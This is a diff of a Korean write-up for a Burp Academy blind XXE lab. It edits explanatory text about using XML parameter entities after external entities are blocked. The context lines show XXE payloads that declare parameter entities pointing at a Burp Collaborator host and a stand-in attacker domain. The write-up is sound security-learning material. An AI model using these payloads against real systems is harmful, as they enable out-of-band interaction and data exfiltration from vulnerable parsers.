@@ -92,7 +92,7 @@ Content-Length: 47
 "Entities are not allowed for security reasons"
 ```
 
-문제 설명에 따르면 External 엔터티는 사용하지 못하지만 Parameter 엔터티라고 하는 것은 사용가능한 것 같다. Parameter 엔터티를 어떻게 사용하는지 알아보자.  
+문제 설명에 따르면 External 엔터티는 사용하지 못하지만 **Parameter 엔터티라고 하는 것은 사용가능**한 것 같다. Parameter 엔터티를 어떻게 사용하는지 알아보자.  
 
 Burp Academy의 [Blind XXE 설명 페이지](https://portswigger.net/web-security/xxe/blind) 에 따르면 `%` 를 사용해서 Parameter 엔터티의 선언 및 사용을 할 수 있다고 한다.  예를 들면 다음과 같은 식이다. 
 - 변수명 앞에 `%`를 붙인다. 
@@ -103,7 +103,7 @@ Burp Academy의 [Blind XXE 설명 페이지](https://portswigger.net/web-securit
 ```
 
 ## 2차 시도 
-다음과 같이 Parameter 엔터티를 선언하고 참조하도록 바꿔보았다. 
+다음과 같이 Parameter 엔터티를 선언하고 참조하도록 페이로드를 바꿔보았다. 
 
 ```xml
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://xxetest.burpcollaborator.net"> ] >
@@ -131,7 +131,7 @@ Content-Length: 20
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
 ```
 
-페이로드를 다음과 같이 변경했다. 
+페이로드를 다음과 같이 변경했다. XML에서 데이터를 출력하는 위치를 productId에서 <!DOCTYPE>을 정의하는 엘레먼트 내부로 변경했다.
 
 ```xml 
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://xxetest.burpcollaborator.net"> %xxe;] >
